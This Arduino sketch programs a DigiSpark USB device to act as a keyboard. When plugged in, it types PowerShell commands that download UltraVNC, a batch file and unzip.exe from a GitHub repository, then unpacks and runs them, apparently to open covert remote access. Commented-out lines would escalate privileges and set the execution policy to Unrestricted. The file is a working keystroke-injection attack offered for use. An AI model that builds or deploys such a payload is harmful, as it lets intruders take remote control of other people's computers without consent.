//This DigiSpark scripts downloads and executes a powershell script in hidden mode.
//Original author: https://github.com/CedArctic/DigiSpark-Scripts/blob/master/Execute_Powershell_Script/Execute_Powershell_Script.ino
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/zorbaproject/Guercio/master/UltraVNC.zip\" , \"UltraVNC.zip\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/zorbaproject/Guercio/master/guercio.bat\" , \"guercio.bat\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  //Works only on powershell 5 or later
  /*DigiKeyboard.print("Expand-Archive -Path UltraVNC.zip -DestinationPath UltraVNC");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);*/
  DigiKeyboard.print("$client.DownloadFile(\"https://raw.githubusercontent.com/zorbaproject/Guercio/master/unzip.exe\" , \"unzip.exe\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print(".\unzip.exe .\UltraVNC.zip");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  //If the system hasn't been configured to run scripts, uncomment the lines bellow
  /*DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);
  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_Y);
  DigiKeyboard.delay(750);
  DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);*/
  //
  //Now we can close powershell
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT | KEY_R);
  DigiKeyboard.delay(750);
  DigiKeyboard.print("%USERPROFILE%\\guercio.bat");
  //DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\guercio.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //This is to ignore errors with dlls
  /*for (int i = o; i <10; i++) {
	  DigiKeyboard.delay(1200);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
  }*/
  for (;;) {
    /*empty*/
  }

}